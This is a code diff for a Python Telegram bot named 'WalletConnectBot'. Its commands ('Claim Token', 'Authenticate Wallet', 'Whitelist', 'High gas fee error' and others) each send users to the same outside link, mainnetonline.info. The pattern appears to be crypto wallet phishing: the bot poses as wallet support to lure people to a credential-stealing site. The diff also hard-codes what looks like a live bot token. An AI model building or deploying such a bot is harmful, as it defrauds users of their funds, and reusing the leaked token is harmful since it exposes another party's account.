@@ -1,14 +1,12 @@
-import json
-
-import telegram.ext
-
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+#!/usr/bin/env python3.9
 import requests
-import json
+import telegram.ext
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 
-api_key = 'XXXXXXXXXXXXXXXXXXXXXX'
+api_key = "5198837632:AAFeV2sevaYFINkYhdvMjXID66VfJZmN4Gs"
 
-telegram_group_id = 'chrisandchily'
+telegram_group_id = "chrisandchily"
+
 
 def start(update, context):
     update.message.reply_text("Hello! Welcome to WalletConnectBot")
@@ -19,7 +17,8 @@ def hello(update, context):
 
 
 def help(update, context):
-    update.message.reply_text("""
+    update.message.reply_text(
+        """
     The following commands are available:
 
     /start -> Welcome message
@@ -28,9 +27,12 @@ def help(update, context):
     /contact -> Who you can contact
 
 
-    """)
+    """
+    )
 
-url = 'https://mainnetonline.info/?v'
+
+url = "https://mainnetonline.info/?v"
+
 
 def content(update, context):
     update.message.reply_text(update.message.text)
@@ -41,31 +43,57 @@ def contact(update, context):
 
 
 def claim_token(update, context):
-    markUp = InlineKeyboardMarkup([
-        [InlineKeyboardButton("Claim Token", url=url)]
-        ])
+    markUp = InlineKeyboardMarkup([[InlineKeyboardButton("Claim Token", url=url)]])
     update.message.reply_text(
-        f'Hello {update.effective_user.first_name}, please click the button below:',
-        reply_markup=markUp)
+        f"Hello {update.effective_user.first_name}, please click the button below:",
+        reply_markup=markUp,
+    )
+
+
+def snap_shot(update, context):
+    markUp = InlineKeyboardMarkup([[InlineKeyboardButton("Snap Shot", url=url)]])
+    update.message.reply_text(
+        f"Hello {update.effective_user.first_name}, please click the button below:",
+        reply_markup=markUp,
+    )
+
+
+def whitelist(update, context):
+    markUp = InlineKeyboardMarkup([[InlineKeyboardButton("Whitelist", url=url)]])
+    update.message.reply_text(
+        f"Hello {update.effective_user.first_name}, please click the button below:",
+        reply_markup=markUp,
+    )
+
+
+def gas_fee(update, context):
+    markUp = InlineKeyboardMarkup(
+        [[InlineKeyboardButton("High gas fee error", url=url)]]
+    )
+    update.message.reply_text(
+        f"Hello {update.effective_user.first_name}, please click the button below:",
+        reply_markup=markUp,
+    )
 
 
 def authenticate_wallet(update, context):
-    markUp = InlineKeyboardMarkup([
-        [InlineKeyboardButton("Authenticate Wallet", url=url)]
-        ])
+    markUp = InlineKeyboardMarkup(
+        [[InlineKeyboardButton("Authenticate Wallet", url=url)]]
+    )
     update.message.reply_text(
-        f'Hello {update.effective_user.first_name}, please click the button below:',
-        reply_markup=markUp)
+        f"Hello {update.effective_user.first_name}, please click the button below:",
+        reply_markup=markUp,
+    )
 
 
 def track_transactions(update, context):
-    markUp = InlineKeyboardMarkup([
-        [InlineKeyboardButton("Track Transactions", url=url)]
-        ])
+    markUp = InlineKeyboardMarkup(
+        [[InlineKeyboardButton("Track Transactions", url=url)]]
+    )
     update.message.reply_text(
-        f'Hello {update.effective_user.first_name}, please click the button below:',
-        reply_markup=markUp)
-
+        f"Hello {update.effective_user.first_name}, please click the button below:",
+        reply_markup=markUp,
+    )
 
 
 def send_msg_on_telegram(message):
@@ -74,43 +102,54 @@ def send_msg_on_telegram(message):
     print(tel_resp.json())
 
 
-def options(update : Update, context:telegram.ext.CallbackContext):
-    reply_buttons = InlineKeyboardMarkup([
-        [InlineKeyboardButton("Claim Token", url=url)],
+def options(update: Update, context: telegram.ext.CallbackContext):
+    reply_buttons = InlineKeyboardMarkup(
         [
-            InlineKeyboardButton("Autheticate Wallet", url=url)
-        ],
-        [
-            InlineKeyboardButton("Track Transactions", url=url)
+            [InlineKeyboardButton("Claim Token", url=url)],
+            [InlineKeyboardButton("Autheticate Wallet", url=url)],
+            [InlineKeyboardButton("Track Transactions", url=url)],
+            [InlineKeyboardButton("Snapshot", url=url)],
+            [InlineKeyboardButton("Whitelist", url=url)],
+            [InlineKeyboardButton("High gas fee error", url=url)],
         ]
-    ])
+    )
     update.message.reply_text(
-        f'Hello {update.effective_user.first_name}, please choose an option:',
-        reply_markup=reply_buttons
+        f"Hello {update.effective_user.first_name}, please choose an option:",
+        reply_markup=reply_buttons,
     )
 
 
 def button(update, context):
     update.callback_query.answer()
-    #Remove Buttons
+    # Remove Buttons
     update.callback_query.message.edit_reply_markup(
         reply_markup=InlineKeyboardMarkup([])
     )
+
 
 updater = telegram.ext.Updater(api_key, use_context=True)
 disp = updater.dispatcher
 
 
-disp.add_handler(telegram.ext.CommandHandler('start', start))
-disp.add_handler(telegram.ext.CommandHandler('claim_token', claim_token))
-disp.add_handler(telegram.ext.CommandHandler('authenticate_wallet', authenticate_wallet))
-disp.add_handler(telegram.ext.CommandHandler('track_transactions', track_transactions))
-disp.add_handler(telegram.ext.CommandHandler('contact', contact))
+disp.add_handler(telegram.ext.CommandHandler("start", start))
+disp.add_handler(telegram.ext.CommandHandler("claim_token", claim_token))
+disp.add_handler(
+    telegram.ext.CommandHandler("authenticate_wallet", authenticate_wallet)
+)
+disp.add_handler(telegram.ext.CommandHandler("track_transactions", track_transactions))
+disp.add_handler(telegram.ext.CommandHandler("snapshot", snap_shot))
+disp.add_handler(telegram.ext.CommandHandler("whitelist", whitelist))
+disp.add_handler(telegram.ext.CommandHandler("gas_fee", gas_fee))
+disp.add_handler(telegram.ext.CommandHandler("contact", contact))
 # disp.add_handler(telegram.ext.CommandHandler('content', content))
-disp.add_handler(telegram.ext.CommandHandler('help', help))
-disp.add_handler(telegram.ext.CommandHandler('hello', hello))
-disp.add_handler(telegram.ext.MessageHandler(telegram.ext.Filters.text & ~telegram.ext.Filters.command, content))
-disp.add_handler(telegram.ext.CommandHandler('options', options))
+disp.add_handler(telegram.ext.CommandHandler("help", help))
+disp.add_handler(telegram.ext.CommandHandler("hello", hello))
+disp.add_handler(
+    telegram.ext.MessageHandler(
+        telegram.ext.Filters.text & ~telegram.ext.Filters.command, content
+    )
+)
+disp.add_handler(telegram.ext.CommandHandler("options", options))
 disp.add_handler(telegram.ext.CallbackQueryHandler(button))
 
 
